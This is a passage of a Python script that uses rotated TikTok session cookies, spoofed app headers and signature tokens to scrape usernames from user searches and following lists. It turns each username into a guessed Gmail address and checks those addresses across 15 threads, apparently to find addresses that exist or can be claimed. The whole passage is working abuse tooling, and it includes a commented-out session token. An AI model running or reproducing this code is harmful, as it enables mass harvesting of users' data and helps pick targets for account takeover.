 < \033[1;33mBad Em \033[0m  - \033[1;31m{no}\033[0m   >
 < \033[1;31mBad Gm \033[0m  - \033[1;35m{nod}\033[0m  >
 < \033[1;36mCh mail\033[0m  - \033[1;32m{email}\033[0m>
\033[1;35m - — — — — — — — — — — — — —\033[0m
''');sys.stdout.flush()
		check_gmail(email)
	else:
		os.system('clear')
		no+=1
		sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
 < \033[1;32mGood Gm\033[0m  - \033[1;36m{yas}\033[0m  > 
 < \033[1;34mGood Em\033[0m  - \033[1;33m{ya}\033[0m   >
 < \033[1;33mBad Em \033[0m  - \033[1;31m{no}\033[0m   >
 < \033[1;31mBad Gm \033[0m  - \033[1;35m{nod}\033[0m  >
 < \033[1;36mCh mail\033[0m  - \033[1;32m{email}\033[0m>
\033[1;35m - — — — — — — — — — — — — —\033[0m
''');sys.stdout.flush()
def rrandom():
#        try:
#        	e=open(nameee, 'r').read().splitlines()
#        except:
#        	print(f'{Z}The file does not exist ! ')
#        	exit()
        while True: 
                cookies={"sessionid": random.choice(nameee)}
                #print(cookies) 
            #try:
                g=choice(
            [
'éèêëàâäôùûüîïçabcdefghijklmnopqrstuvwxyz',
'azertyuiopmlkjhgfdsqwxcvbn', 

            ]

        )
                keyword=''.join((choice(g) for i in range(randrange(3,9))))
               
                idd6= "".join(choice('1234567890')for i in range(19))
                he3 = {"User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {randrange(7,13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{randrange(3,9)}.0)'}
                ttwid=requests.get('https://www.tiktok.com/',headers=he3).cookies.get_dict()['ttwid']
                zaid = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
                msToken = zaid.cookies.get_dict()['msToken']
                ses=str(uuid4()).replace('-', '')
                headers = {
    'authority': 'www.tiktok.com',
    'accept': '*/*',
    'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
     'cookie': f'tt_csrf_token='+msToken+'; tiktok_webapp_theme_source=auto; ttwid='+ttwid+'; msToken='+msToken+'; msToken='+msToken,     
    'referer': 'https://www.tiktok.com/search/user?q=zaid&t=1748293691509',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}
                try:
                	response = requests.get(
    f'https://www.tiktok.com/api/search/user/full/?WebIdLastTime=1743253520&aid=1988&app_language=ar&app_name=tiktok_web&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20armv81&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&data_collection_enabled=true&device_platform=web_pc&focus_state=true&from_page=search&history_len=7&is_fullscreen=false&is_page_visible=true&keyword={keyword}&odinId=7487216848657548295&os=linux&priority_region=&referer=https%3A%2F%2Fwww.google.com%2F&region=IQ&root_referer=https%3A%2F%2Fwww.google.com%2F&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&user_is_login=false&web_search_code=%7B%22tiktok%22%3A%7B%22client_params_x%22%3A%7B%22search_engine%22%3A%7B%22ies_mt_user_live_video_card_use_libra%22%3A1%2C%22mt_search_general_user_live_card%22%3A1%7D%7D%2C%22search_server%22%3A%7B%7D%7D%7D&webcast_language=ar&msToken='+msToken+'&X-Bogus=DFSzswVLXlbANxkCCVDW0Yx3eRvH&X-Gnarly='+ttwid,
    cookies=None,
    headers=headers,
).json()
                	#print(response)
                except:
                	continue
                for users in response['user_list']:
                    ud = (users['user_info']['uid'])
                    user=(users['user_info']['unique_id'])
                    #print(ud)
                    url = f'https://api16-normal-c-alisg.tiktokv.com/aweme/v1/user/following/list/?user_id={ud}&max_time=1743489872&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&_rticket=1751943044632&mcc_mnc=41805&carrier_region_v2=418&ts=1751943043&sec_user_id={user}&';he = {
    'Host': 'api16-normal-c-alisg.tiktokv.com',
    #'x-tt-token': '03492198ec600b15d19d6efac692966a710090aafebfa4f45d16114089eb0b1b83c6b162948ec03dee14986dac10598f902699205853d24e35bf9bfbe632b30d472d823bab52a9a192876ff034fd964ca1f44cf993c9af9ba3d841169bc9e7a4b1062-CkAyNzAyNmM1MzU0ZTM1Nzc2M2MxZDRlOGY3YTgzMTE0NGQ3M2NiMTA1MThhNmE4ZGMwYTU1Mjc3MTgxMmQ0N2Fi-2.0.0',
    'sdk-version': '1',
    'x-ss-dp': '1233',
    'x-tt-trace-id': '00-fd7797581062c1cf916902c605c404d1-fd7797581062c1cf-01',
    'user-agent': 'com.zhiliaoapp.musically/2021306050 (Linux; U; Android 13; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/TTNetVersion:57844a4b 2019-10-16)',
    #'x-khronos': '1730829325',
    #'x-gorgon': '0300f0e1040018497903e96d332ec88aa707649b33f5f150e468',
    'x-common-params-v2': 'manifest_version_code=2021306050&current_region=IQ&app_language=ar&app_type=normal&iid=7522474161604937528&channel=googleplay&device_type=ANY-LX2&language=ar&locale=ar&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2021306050&ac2=wifi&sys_region=IQ&os_api=33&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&residence=IQ&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&pass-route=1&os_version=13&timezone_offset=10800&version_code=130605&app_name=musical_ly&ab_version=13.6.5&version_name=13.6.5&device_brand=HONOR&ssmix=a&pass-region=1&device_platform=android&build_number=13.6.5&region=ar&aid=1233',
}
                    re = requests.get(url,headers=he,cookies=cookies).json()
                    zz=0
                    try:
                    	while True:
                    		zz+=1
                    		us=(re['followings'][zz]['unique_id'])
                    		fol=re['followings'][zz]['follower_count']
                    		if '_' in us:
                    			continue
                    		email=us+"@gmail.com"
                    		chzm(email,cookies)
                    except:
                    	#except:
                    	print(".", end="",flush=True)
threads = []
for i in range(15):
	t = threading.Thread(target=rrandom)
	threads.append(t)
	t.start()    
